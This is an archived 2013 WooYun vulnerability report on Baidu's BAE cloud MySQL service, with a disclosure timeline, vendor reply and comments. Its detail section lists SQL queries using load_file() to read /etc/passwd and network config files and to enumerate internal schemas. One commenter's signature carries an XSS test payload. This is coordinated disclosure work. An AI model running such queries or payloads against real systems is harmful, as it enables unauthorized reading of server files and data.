{"id": 12917, "wybug_id": "wooyun-2013-020693", "wybug_title": "百度BAE系列1:数据库信息泄漏、任意文件读取", "wybug_corp": "百度", "wybug_author": "blue", "wybug_date": "2013-03-26 12:33", "wybug_open_date": "2013-05-10 12:33", "wybug_type": "应用配置错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "用户敏感信息泄漏", "设计不当导致攻击界面扩大", "盲目信任用户数据", "任意文件读取利用", "黑盒", "黑盒分析技巧", "数据库账户权限过高", "沙盒环境绕过", "云安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-03-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-03-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-04-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-04-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-04-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-05-10：\t细节向公众公开  简要描述： 通过一定方式可读取数据库相关内容，查看服务器文件等。 详细说明：  MySQL(云数据库) phpMyAdmin管理时，insert into 表 select load_file('/etc/passwd')等可读取本地文件内容，也可查询information_schema库内容。目测是读和写操作使用了不同的数据库账号。\n/* 以下结果是不同的 */select user();insert into tmp(data) select user();\n\n/* 一些可执行的操作 *///文件读取insert into test(data) select load_file('/etc/passwd');insert into test(data) select load_file('/etc/issue');insert into test(data) select load_file('/etc/sysconfig/network-scripts/ifcfg-eth0');//数据结构读取insert into test(data) select load_file('/etc/sysconfig/network-scripts/ifcfg-eth1');insert into test(data) select SCHEMA_NAME from information_schema.SCHEMATA limit 10;insert into test(data) select concat('databases:',COUNT(*)) from information_schema.SCHEMATA;insert into test(data) select concat('ibase_bae_code tables:',group_concat(TABLE_NAME)) from information_schema.TABLES where TABLE_SCHEMA='ibase_bae_code';insert into test(data) select concat('ibase_bae_code.apps columns:',group_concat(COLUMN_NAME)) from information_schema.COLUMNS where TABLE_SCHEMA='ibase_bae_code' AND TABLE_NAME='apps';insert into test(data) select concat('ibase_bae_code tables:',group_concat(TABLE_NAME)) from information_schema.TABLES where TABLE_SCHEMA='ibase_bae_code';insert into test(data) select concat('ns_bae_yun_pma tables:',group_concat(TABLE_NAME)) from information_schema.TABLES where TABLE_SCHEMA='ns_bae_yun_pma';insert into test(data) select concat('ns_bae_yun_pma.pma_session columns:',group_concat(COLUMN_NAME)) from information_schema.COLUMNS where TABLE_SCHEMA='ns_bae_yun_pma' AND TABLE_NAME='pma_session';\n   漏洞证明：  \n\n   修复方案：  控制文件和数据库操作权限，修复时注意通过平台上的数据导入也是可以执行的。   版权声明：转载请注明来源 blue@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-03-26 16:20 厂商回复： 感谢提交，处理中... 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-03-26 12:34 |    \t\terevus \t\t\t( 普通白帽子  |\t\t\t        Rank:177 漏洞数:30        | Hacked by @ringzero 我錯了)\t\t \n  有系列看了    \n     2013-03-26 12:43 |    \t\t苏南同学 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:5        | 苏南同学，就是苏南同学~~~)\t\t \n  连载吗？    \n     2013-03-26 12:52 |    \t\t姿势不行 \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:7        | 我是爱卖萌的小阿狸呀http://www.qinqinyo....)\t\t \n  坐等更新    \n     2013-03-26 13:04 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  我决定要去连载个sql系列。~    \n     2013-03-26 15:49 |    \t\tdtc \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 业余技术爱好者，来乌云学习。)\t\t \n  坐等    \n     2013-03-26 17:07 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:170        | 力不从心)\t\t \n  期待下连载    \n     2013-03-26 17:09 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  大牛连载，必关注    \n     2013-03-27 09:42 |    \t\tDefa \t\t\t( 普通白帽子  |\t\t\t        Rank:113 漏洞数:13        | <img src=1 onerror=alert(1)>)\t\t \n  大牛连载，必定精彩    \n     2013-04-26 17:12 |    \t\t八折 \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:12        | 我的作用不大，只能让你的坏心情打八折——...)\t\t \n  关注之    \n     2013-08-06 17:15 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  好!    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}